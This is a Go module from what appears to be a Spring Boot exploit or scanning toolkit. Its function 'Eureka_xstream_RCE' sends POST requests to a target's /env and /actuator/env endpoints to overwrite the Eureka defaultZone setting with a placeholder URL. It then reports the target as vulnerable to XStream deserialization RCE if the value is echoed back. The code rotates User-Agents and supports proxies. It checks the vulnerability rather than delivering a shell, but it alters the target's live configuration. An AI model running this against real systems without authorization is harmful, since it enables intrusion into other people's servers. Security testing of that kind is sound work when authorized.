package exppackage

import (
	"github.com/fatih/color"
	"ssp/common"
	"strings"
)

func Eureka_xstream_RCE(url, proxyURL string) {
	headers1 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	headers2 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/json",
	}

	payload1 := "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
	payload2 := "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"

	resp1, body1, err := common.MakeRequest(url+"env", "POST", proxyURL, headers1, payload1)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}

	resp2, body2, err := common.MakeRequest(url+"actuator/env", "POST", proxyURL, headers2, payload2)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}

	if strings.Contains(string(body1), "127.0.0.2") {
		common.PrintVulnerabilityConfirmation("EurekaXstreamRCE", url+"env", payload1, "6")
	} else if strings.Contains(string(body2), "127.0.0.2") {
		common.PrintVulnerabilityConfirmation("EurekaXstreamRCE", url+"actuator/env", payload2, "6")
	} else {
		color.Yellow("[-] %s 未发现Eureka_Xstream反序列化漏洞\n", url)
	}
	defer resp1.Body.Close()
	defer resp2.Body.Close()
}
